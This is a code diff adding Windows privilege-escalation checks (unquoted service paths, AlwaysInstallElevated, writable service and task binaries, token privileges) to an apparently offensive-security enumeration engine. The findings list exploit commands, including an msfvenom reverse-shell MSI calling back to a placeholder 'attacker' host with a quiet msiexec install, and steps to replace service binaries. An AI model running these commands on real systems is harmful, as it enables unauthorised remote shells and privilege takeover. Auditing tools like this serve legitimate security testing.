@@ -329,14 +329,218 @@ class PrivilegeEscalationEngine:
     def _check_windows_privesc(self) -> List[PrivEscVector]:
         """Windows 權限提升檢查"""
         vectors = []
-        
-        # Windows 檢查邏輯（示例）
-        logger.info("Windows privilege escalation checks not fully implemented yet")
-        
+
         # 1. Unquoted Service Paths
-        # 2. Weak Service Permissions
-        # 3. AlwaysInstallElevated
-        # 4. Scheduled Tasks
-        # 5. Token Impersonation
-        
+        vectors.extend(self._check_unquoted_service_paths())
+
+        # 2. AlwaysInstallElevated
+        vectors.extend(self._check_always_install_elevated())
+
+        # 3. Writable Service Executables
+        vectors.extend(self._check_writable_service_binaries())
+
+        # 4. Scheduled Tasks with weak permissions
+        vectors.extend(self._check_windows_scheduled_tasks())
+
+        # 5. Token / Privilege checks
+        vectors.extend(self._check_windows_token_privileges())
+
+        return vectors
+
+    def _check_unquoted_service_paths(self) -> List[PrivEscVector]:
+        """檢查未加引號的服務路徑"""
+        vectors = []
+        try:
+            result = subprocess.run(
+                ["wmic", "service", "get", "name,displayname,pathname,startmode"],
+                capture_output=True, text=True, timeout=30
+            )
+            for line in result.stdout.split("\n"):
+                line = line.strip()
+                if not line or "PathName" in line:
+                    continue
+                # Find paths with spaces that are not quoted
+                parts = line.split()
+                # Extract path portion (after service name columns)
+                for i, part in enumerate(parts):
+                    if "\\" in part and " " in line and '"' not in line:
+                        # Check if the path has spaces and is unquoted
+                        path_candidate = " ".join(parts[i:])
+                        if " " in path_candidate and not path_candidate.startswith('"'):
+                            vectors.append(PrivEscVector(
+                                id=f"PRIVESC-WIN-UNQUOTED-{parts[0][:20].upper()}",
+                                severity=Severity.HIGH,
+                                confidence=Confidence.HIGH,
+                                title=f"Unquoted Service Path: {parts[0]}",
+                                description=f"Service has unquoted path with spaces, allowing DLL/binary hijacking",
+                                evidence={"service": parts[0], "path": path_candidate},
+                                recommendation="Quote the service binary path in the registry",
+                                exploit_commands=[
+                                    "# Place malicious executable in writable parent directory"
+                                ],
+                                category="unquoted_service"
+                            ))
+                            break
+        except FileNotFoundError:
+            logger.debug("wmic not available")
+        except subprocess.TimeoutExpired:
+            logger.warning("Unquoted service path check timed out")
+        except Exception as e:
+            logger.error(f"Error checking unquoted service paths: {e}")
+        return vectors
+
+    def _check_always_install_elevated(self) -> List[PrivEscVector]:
+        """檢查 AlwaysInstallElevated 設定"""
+        vectors = []
+        try:
+            reg_paths = [
+                r"HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer",
+                r"HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer",
+            ]
+            for reg_path in reg_paths:
+                result = subprocess.run(
+                    ["reg", "query", reg_path, "/v", "AlwaysInstallElevated"],
+                    capture_output=True, text=True, timeout=10
+                )
+                if "0x1" in result.stdout:
+                    hive = "HKLM" if "HKLM" in reg_path else "HKCU"
+                    vectors.append(PrivEscVector(
+                        id=f"PRIVESC-WIN-ALWAYSINSTALL-{hive}",
+                        severity=Severity.CRITICAL,
+                        confidence=Confidence.HIGH,
+                        title=f"AlwaysInstallElevated Enabled ({hive})",
+                        description="Windows Installer always runs with elevated privileges, any user can install malicious MSI",
+                        evidence={"registry_path": reg_path, "value": "0x1"},
+                        recommendation="Disable AlwaysInstallElevated in Group Policy",
+                        exploit_commands=[
+                            "msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o evil.msi",
+                            "msiexec /quiet /qn /i evil.msi"
+                        ],
+                        category="always_install_elevated"
+                    ))
+        except FileNotFoundError:
+            logger.debug("reg command not available")
+        except Exception as e:
+            logger.error(f"Error checking AlwaysInstallElevated: {e}")
+        return vectors
+
+    def _check_writable_service_binaries(self) -> List[PrivEscVector]:
+        """檢查可寫入的服務執行檔"""
+        vectors = []
+        try:
+            result = subprocess.run(
+                ["wmic", "service", "get", "name,pathname", "/format:csv"],
+                capture_output=True, text=True, timeout=30
+            )
+            for line in result.stdout.split("\n"):
+                parts = line.strip().split(",")
+                if len(parts) < 3:
+                    continue
+                service_name = parts[1]
+                service_path = parts[2].strip('"').split(" ")[0] if len(parts) > 2 else ""
+                if not service_path or not os.path.exists(service_path):
+                    continue
+                if os.access(service_path, os.W_OK):
+                    vectors.append(PrivEscVector(
+                        id=f"PRIVESC-WIN-WRITABLE-SVC-{service_name[:20].upper()}",
+                        severity=Severity.CRITICAL,
+                        confidence=Confidence.HIGH,
+                        title=f"Writable Service Binary: {service_name}",
+                        description=f"Service binary {service_path} is writable, can be replaced with malicious executable",
+                        evidence={"service": service_name, "path": service_path},
+                        recommendation=f"Restrict write access to {service_path}",
+                        exploit_commands=[
+                            f"# Replace {service_path} with malicious binary",
+                            f"sc stop {service_name}",
+                            f"sc start {service_name}"
+                        ],
+                        category="writable_service"
+                    ))
+        except FileNotFoundError:
+            logger.debug("wmic not available")
+        except Exception as e:
+            logger.error(f"Error checking writable service binaries: {e}")
+        return vectors
+
+    def _check_windows_scheduled_tasks(self) -> List[PrivEscVector]:
+        """檢查可利用的排程工作"""
+        vectors = []
+        try:
+            result = subprocess.run(
+                ["schtasks", "/query", "/fo", "CSV", "/v"],
+                capture_output=True, text=True, timeout=30
+            )
+            for line in result.stdout.split("\n"):
+                parts = line.strip().split(",")
+                if len(parts) < 9:
+                    continue
+                task_name = parts[1].strip('"')
+                task_path = parts[8].strip('"') if len(parts) > 8 else ""
+                run_as = parts[7].strip('"') if len(parts) > 7 else ""
+
+                if not task_path or task_path == "Task To Run":
+                    continue
+
+                # Check if task runs as SYSTEM and binary is writable
+                binary = task_path.split(" ")[0].strip('"')
+                if ("SYSTEM" in run_as or "Administrator" in run_as) and os.path.exists(binary) and os.access(binary, os.W_OK):
+                    vectors.append(PrivEscVector(
+                        id=f"PRIVESC-WIN-SCHTASK-{task_name[:20].upper().replace(' ', '_')}",
+                        severity=Severity.HIGH,
+                        confidence=Confidence.HIGH,
+                        title=f"Writable Scheduled Task Binary: {task_name}",
+                        description=f"Scheduled task runs as {run_as} with writable binary {binary}",
+                        evidence={"task": task_name, "binary": binary, "run_as": run_as},
+                        recommendation="Restrict write access to scheduled task binaries",
+                        exploit_commands=[
+                            f"# Replace {binary} with malicious binary"
+                        ],
+                        category="scheduled_task"
+                    ))
+        except FileNotFoundError:
+            logger.debug("schtasks not available")
+        except subprocess.TimeoutExpired:
+            logger.warning("Scheduled tasks check timed out")
+        except Exception as e:
+            logger.error(f"Error checking scheduled tasks: {e}")
+        return vectors
+
+    def _check_windows_token_privileges(self) -> List[PrivEscVector]:
+        """檢查當前使用者的 Token 權限"""
+        vectors = []
+        try:
+            result = subprocess.run(
+                ["whoami", "/priv"],
+                capture_output=True, text=True, timeout=10
+            )
+
+            dangerous_privs = {
+                "SeImpersonatePrivilege": ("Token Impersonation", "Potato-family attacks (JuicyPotato, PrintSpoofer)"),
+                "SeAssignPrimaryTokenPrivilege": ("Assign Primary Token", "Create process with elevated token"),
+                "SeDebugPrivilege": ("Debug Privilege", "Inject into privileged processes"),
+                "SeBackupPrivilege": ("Backup Privilege", "Read any file on the system"),
+                "SeRestorePrivilege": ("Restore Privilege", "Write to any file on the system"),
+                "SeTakeOwnershipPrivilege": ("Take Ownership", "Take ownership of any securable object"),
+                "SeLoadDriverPrivilege": ("Load Driver", "Load kernel-mode drivers"),
+            }
+
+            for priv_name, (title, desc) in dangerous_privs.items():
+                if priv_name in result.stdout and "Enabled" in result.stdout.split(priv_name)[1].split("\n")[0]:
+                    vectors.append(PrivEscVector(
+                        id=f"PRIVESC-WIN-TOKEN-{priv_name.upper()}",
+                        severity=Severity.CRITICAL if priv_name in ("SeImpersonatePrivilege", "SeDebugPrivilege") else Severity.HIGH,
+                        confidence=Confidence.HIGH,
+                        title=f"Dangerous Token Privilege: {title}",
+                        description=f"{priv_name} is enabled - {desc}",
+                        evidence={"privilege": priv_name, "status": "Enabled"},
+                        recommendation=f"Remove {priv_name} from user/service account unless absolutely required",
+                        exploit_commands=[
+                            f"# Exploit {priv_name} for privilege escalation"
+                        ],
+                        category="token_privilege"
+                    ))
+        except FileNotFoundError:
+            logger.debug("whoami not available")
+        except Exception as e:
+            logger.error(f"Error checking token privileges: {e}")
         return vectors
